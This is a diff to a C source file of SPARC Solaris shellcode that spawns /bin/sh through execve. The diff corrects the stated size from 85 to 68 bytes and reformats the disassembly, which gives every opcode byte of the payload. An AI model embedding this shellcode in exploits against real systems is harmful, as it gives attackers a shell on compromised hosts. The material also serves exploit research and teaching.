@@ -10,7 +10,7 @@
 
 /*
  * SunOS (Solaris) / (sun4u / sparc32) execve("/bin/sh", {"/bin/sh", NULL},
- * NULL) 85 bytes shellcode
+ * NULL) 68 bytes shellcode
  *
  * Paulus Gandung Prakosa <gandung@galactic.demon.co.uk>
  *
@@ -19,23 +19,23 @@
  * Disassembly of section .text:
  *
  * 00010074 <_start>:
- * 10074:	11 0b cb d8 	sethi  %hi(0x2f2f6000), %o0
- * 10078:	90 12 22 69 	or  %o0, 0x269, %o0	! 2f2f6269 <__bss_start+0x2f2d61b1>
- * 1007c:	13 1b 8b dc 	sethi  %hi(0x6e2f7000), %o1
- * 10080:	92 12 63 68 	or  %o1, 0x368, %o1	! 6e2f7368 <__bss_start+0x6e2d72b0>
- * 10084:	94 02 a0 01 	inc  %o2
- * 10088:	94 22 a0 01 	dec  %o2
- * 1008c:	d4 23 bf fc 	st  %o2, [ %sp + -4 ]
- * 10090:	d2 23 bf f8 	st  %o1, [ %sp + -8 ]
- * 10094:	d0 23 bf f4 	st  %o0, [ %sp + -12 ]
- * 10098:	90 23 a0 0c 	sub  %sp, 0xc, %o0
- * 1009c:	d4 23 bf f0 	st  %o2, [ %sp + -16 ]
- * 100a0:	d0 23 bf ec 	st  %o0, [ %sp + -20 ]
- * 100a4:	94 02 a0 01 	inc  %o2
- * 100a8:	94 22 a0 01 	dec  %o2
- * 100ac:	92 23 a0 14 	sub  %sp, 0x14, %o1
- * 100b0:	82 10 20 3b 	mov  0x3b, %g1
- * 100b4:	91 d0 20 10 	ta  0x10
+ * 10074:   11 0b cb d8     sethi  %hi(0x2f2f6000), %o0
+ * 10078:   90 12 22 69     or  %o0, 0x269, %o0 ! 2f2f6269 <__bss_start+0x2f2d61b1>
+ * 1007c:   13 1b 8b dc     sethi  %hi(0x6e2f7000), %o1
+ * 10080:   92 12 63 68     or  %o1, 0x368, %o1 ! 6e2f7368 <__bss_start+0x6e2d72b0>
+ * 10084:   94 02 a0 01     inc  %o2
+ * 10088:   94 22 a0 01     dec  %o2
+ * 1008c:   d4 23 bf fc     st  %o2, [ %sp + -4 ]
+ * 10090:   d2 23 bf f8     st  %o1, [ %sp + -8 ]
+ * 10094:   d0 23 bf f4     st  %o0, [ %sp + -12 ]
+ * 10098:   90 23 a0 0c     sub  %sp, 0xc, %o0
+ * 1009c:   d4 23 bf f0     st  %o2, [ %sp + -16 ]
+ * 100a0:   d0 23 bf ec     st  %o0, [ %sp + -20 ]
+ * 100a4:   94 02 a0 01     inc  %o2
+ * 100a8:   94 22 a0 01     dec  %o2
+ * 100ac:   92 23 a0 14     sub  %sp, 0x14, %o1
+ * 100b0:   82 10 20 3b     mov  0x3b, %g1
+ * 100b4:   91 d0 20 10     ta  0x10
  */
 
 #ifndef __sect_shellcode
